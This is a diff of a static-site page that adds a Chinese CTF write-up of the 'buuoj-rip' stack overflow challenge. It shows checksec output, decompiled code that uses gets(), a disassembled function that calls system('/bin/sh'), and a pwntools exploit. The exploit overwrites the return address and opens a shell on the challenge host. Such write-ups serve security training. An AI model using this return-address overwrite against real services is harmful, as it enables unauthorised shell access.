@@ -13,6 +13,8 @@
         <meta name="description" content="Blog">
       
       
+        <link rel="canonical" href="https://https:/smokeflame.github.io/ctf-wiki/pwn/stackoverflow/buuoj-rip/">
+      
       
         <meta name="author" content="Solitu尘傀">
       
@@ -35,18 +37,18 @@
       
         <meta name="lang:search.tokenizer" content="[\uff0c\u3002]+">
       
-      <link rel="shortcut icon" href="//smokeflame.github.io/ctf-wiki/assets/images/favicon.png">
+      <link rel="shortcut icon" href="../../../assets/images/favicon.png">
       <meta name="generator" content="mkdocs-1.1, mkdocs-material-4.6.3">
     
     
       
-        <title>Blog</title>
+        <title>buuoj-rip - Blog</title>
       
     
     
-      <link rel="stylesheet" href="//smokeflame.github.io/ctf-wiki/assets/stylesheets/application.adb8469c.css">
+      <link rel="stylesheet" href="../../../assets/stylesheets/application.adb8469c.css">
       
-        <link rel="stylesheet" href="//smokeflame.github.io/ctf-wiki/assets/stylesheets/application-palette.a8b3c06d.css">
+        <link rel="stylesheet" href="../../../assets/stylesheets/application-palette.a8b3c06d.css">
       
       
         
@@ -55,7 +57,7 @@
       
     
     
-      <script src="//smokeflame.github.io/ctf-wiki/assets/javascripts/modernizr.86422ebf.js"></script>
+      <script src="../../../assets/javascripts/modernizr.86422ebf.js"></script>
     
     
       
@@ -64,10 +66,10 @@
         <style>body,input{font-family:"Noto Sans","Helvetica Neue",Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Source Code Pro","Courier New",Courier,monospace}</style>
       
     
-    <link rel="stylesheet" href="//smokeflame.github.io/ctf-wiki/assets/fonts/material-icons.css">
+    <link rel="stylesheet" href="../../../assets/fonts/material-icons.css">
     
     
-      <link rel="stylesheet" href="//smokeflame.github.io/ctf-wiki/_static/css/extra.css">
+      <link rel="stylesheet" href="../../../_static/css/extra.css">
     
     
       
@@ -113,7 +115,7 @@
             </span>
             <span class="md-header-nav__topic">
               
-                
+                buuoj-rip
               
             </span>
           
@@ -181,7 +183,9 @@
       
         
 
-<nav class="md-tabs" data-md-component="tabs">
+  
+
+<nav class="md-tabs md-tabs--active" data-md-component="tabs">
   <div class="md-tabs__inner md-grid">
     <ul class="md-tabs__list">
       
@@ -190,7 +194,7 @@
   
     <li class="md-tabs__item">
       
-        <a href="//smokeflame.github.io/ctf-wiki/." class="md-tabs__link">
+        <a href="../../.." class="md-tabs__link">
           introduction
         </a>
       
@@ -207,7 +211,7 @@
   
     <li class="md-tabs__item">
       
-        <a href="//smokeflame.github.io/ctf-wiki/pwn/stackoverflow/buuoj-rip/" class="md-tabs__link">
+        <a href="./" class="md-tabs__link md-tabs__link--active">
           pwn
         </a>
       
@@ -285,7 +289,7 @@
 
 
   <li class="md-nav__item">
-    <a href="//smokeflame.github.io/ctf-wiki/." title="Getting Start" class="md-nav__link">
+    <a href="../../.." title="Getting Start" class="md-nav__link">
       Getting Start
     </a>
   </li>
@@ -300,10 +304,12 @@
       
       
 
+  
 
-  <li class="md-nav__item md-nav__item--nested">
+
+  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
     
-      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2" type="checkbox" id="nav-2">
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2" type="checkbox" id="nav-2" checked>
     
     <label class="md-nav__link" for="nav-2">
       pwn
@@ -319,10 +325,12 @@
           
           
 
+  
 
-  <li class="md-nav__item md-nav__item--nested">
+
+  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
     
-      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-1" type="checkbox" id="nav-2-1">
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-1" type="checkbox" id="nav-2-1" checked>
     
     <label class="md-nav__link" for="nav-2-1">
       Stack Overflow
@@ -338,11 +346,18 @@
           
           
 
+  
 
-  <li class="md-nav__item">
-    <a href="//smokeflame.github.io/ctf-wiki/pwn/stackoverflow/buuoj-rip/" title="buuoj-rip" class="md-nav__link">
+
+  <li class="md-nav__item md-nav__item--active">
+    
+    <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+    
+    
+    <a href="./" title="buuoj-rip" class="md-nav__link md-nav__link--active">
       buuoj-rip
     </a>
+    
   </li>
 
         
@@ -367,8 +382,72 @@
           <div class="md-content">
             <article class="md-content__inner md-typeset">
               
-  <h1>404 - Not found</h1>
+                
+                  <a href="https://github.com/smokeflame/ctf-wiki/blog/master/docs/pwn/stackoverflow/buuoj-rip.md" title="编辑此页" class="md-icon md-content__icon">&#xE3C9;</a>
+                
+                
+                  <h1>buuoj-rip</h1>
+                
+                <p>一道简单的栈溢出</p>
+<div class="codehilite"><pre><span></span><code>$ checksec pwn1
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      No PIE <span class="o">(</span>0x400000<span class="o">)</span>
+    RWX:      Has RWX segments
+</code></pre></div>
 
+<hr />
+<div class="codehilite"><pre><span></span><code><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="kt">char</span> <span class="n">s</span><span class="p">;</span> <span class="c1">// [rsp+1h] [rbp-Fh]</span>
+
+  <span class="n">puts</span><span class="p">(</span><span class="s">&quot;please input&quot;</span><span class="p">);</span>
+  <span class="n">gets</span><span class="p">((</span><span class="kr">__int64</span><span class="p">)</span><span class="o">&amp;</span><span class="n">s</span><span class="p">,</span> <span class="p">(</span><span class="kr">__int64</span><span class="p">)</span><span class="n">argv</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="o">&amp;</span><span class="n">s</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">&quot;ok,bye!!!&quot;</span><span class="p">);</span>
+  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>看到我们的目标函数fun</p>
+<div class="codehilite"><pre><span></span><code><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mo">00000000004011</span><span class="mi">86</span> <span class="p">;</span> <span class="nl">Attributes</span><span class="p">:</span> <span class="n">bp</span><span class="o">-</span><span class="n">based</span> <span class="n">frame</span>
+<span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mo">00000000004011</span><span class="mi">86</span>
+<span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mo">00000000004011</span><span class="mi">86</span>                 <span class="k">public</span> <span class="n">fun</span>
+<span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mo">00000000004011</span><span class="mi">86</span> <span class="n">fun</span>             <span class="n">proc</span> <span class="n">near</span>
+<span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mo">00000000004011</span><span class="mi">86</span> <span class="p">;</span> <span class="n">__unwind</span> <span class="p">{</span>
+<span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mo">00000000004011</span><span class="mi">86</span>                 <span class="n">push</span>    <span class="n">rbp</span>
+<span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mo">00000000004011</span><span class="mi">87</span>                 <span class="n">mov</span>     <span class="n">rbp</span><span class="p">,</span> <span class="n">rsp</span>
+<span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mo">00000000004011</span><span class="mi">8</span><span class="n">A</span>                 <span class="n">lea</span>     <span class="n">rdi</span><span class="p">,</span> <span class="n">command</span>    <span class="p">;</span> <span class="s">&quot;/bin/sh&quot;</span>
+<span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mo">00000000004011</span><span class="mi">91</span>                 <span class="n">call</span>    <span class="n">_system</span>
+<span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mo">00000000004011</span><span class="mi">96</span>                 <span class="n">nop</span>
+<span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mo">00000000004011</span><span class="mi">97</span>                 <span class="n">pop</span>     <span class="n">rbp</span>
+<span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mo">00000000004011</span><span class="mi">98</span>                 <span class="n">retn</span>
+<span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mo">00000000004011</span><span class="mi">98</span> <span class="p">;</span> <span class="p">}</span> <span class="c1">// starts at 401186</span>
+<span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mo">00000000004011</span><span class="mi">98</span> <span class="n">fun</span>             <span class="n">endp</span>
+</code></pre></div>
+
+<p>所以我们需要将main函数的返回地址覆盖为fun函数的地址0x401186</p>
+<p>由于是64位程序，所以我们覆盖为0xF * 'a' + 8 * 'b' + 0x401186</p>
+<p>exp为</p>
+<div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="c1">#io = process(&#39;./pwn1&#39;)</span>
+<span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node3.buuoj.cn&#39;</span><span class="p">,</span> <span class="mi">29755</span><span class="p">)</span>
+
+<span class="n">system_addr</span> <span class="o">=</span> <span class="mh">0x401186</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="mh">0xF</span> <span class="o">*</span> <span class="s1">&#39;a&#39;</span> <span class="o">+</span> <span class="s1">&#39;b&#39;</span> <span class="o">*</span> <span class="mi">8</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">system_addr</span><span class="p">)</span>
+
+<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+                
+                  
+                
+                
+              
               
                 
 
@@ -381,6 +460,27 @@
       
         
 <footer class="md-footer">
+  
+    <div class="md-footer-nav">
+      <nav class="md-footer-nav__inner md-grid">
+        
+          <a href="../../.." title="Getting Start" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
+            <div class="md-flex__cell md-flex__cell--shrink">
+              <i class="md-icon md-icon--arrow-back md-footer-nav__button"></i>
+            </div>
+            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
+              <span class="md-flex__ellipsis">
+                <span class="md-footer-nav__direction">
+                  上一页
+                </span>
+                Getting Start
+              </span>
+            </div>
+          </a>
+        
+        
+      </nav>
+    </div>
   
   <div class="md-footer-meta md-typeset">
     <div class="md-footer-meta__inner md-grid">
@@ -399,30 +499,30 @@
       
     </div>
     
-      <script src="//smokeflame.github.io/ctf-wiki/assets/javascripts/application.c33a9706.js"></script>
+      <script src="../../../assets/javascripts/application.c33a9706.js"></script>
       
         
         
           
-          <script src="//smokeflame.github.io/ctf-wiki/assets/javascripts/lunr/lunr.stemmer.support.js"></script>
+          <script src="../../../assets/javascripts/lunr/lunr.stemmer.support.js"></script>
           
             
               
-                <script src="//smokeflame.github.io/ctf-wiki/assets/javascripts/lunr/tinyseg.js"></script>
+                <script src="../../../assets/javascripts/lunr/tinyseg.js"></script>
               
               
-                <script src="//smokeflame.github.io/ctf-wiki/assets/javascripts/lunr/lunr.ja.js"></script>
+                <script src="../../../assets/javascripts/lunr/lunr.ja.js"></script>
               
             
           
           
         
       
-      <script>app.initialize({version:"1.1",url:{base:"//smokeflame.github.io/ctf-wiki/"}})</script>
+      <script>app.initialize({version:"1.1",url:{base:"../../.."}})</script>
       
         <script src="https://cdnjs.loli.net/ajax/libs/pangu/3.3.0/pangu.min.js"></script>
       
-        <script src="//smokeflame.github.io/ctf-wiki/_static/js/extra.js"></script>
+        <script src="../../../_static/js/extra.js"></script>
       
         <script src="https://cdnjs.loli.net/ajax/libs/mathjax/2.7.2/MathJax.js?config=TeX-MML-AM_CHTML"></script>
       
